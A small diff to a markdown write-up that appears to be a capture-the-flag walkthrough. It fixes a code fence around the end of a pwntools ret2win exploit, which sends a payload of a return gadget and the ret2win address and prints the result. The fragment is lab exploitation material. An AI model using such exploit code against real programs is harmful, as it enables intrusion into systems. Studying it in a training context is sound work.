@@ -38,9 +38,10 @@ payload = flat(
         ret_gadget,
         elf.symbols.ret2win
         )
-```
+
 p.sendlineafter(b'>', payload)
 success(p.recvall())
+```
 
 ![Alt Text](img/successful_pwntools_exploit.png)
 
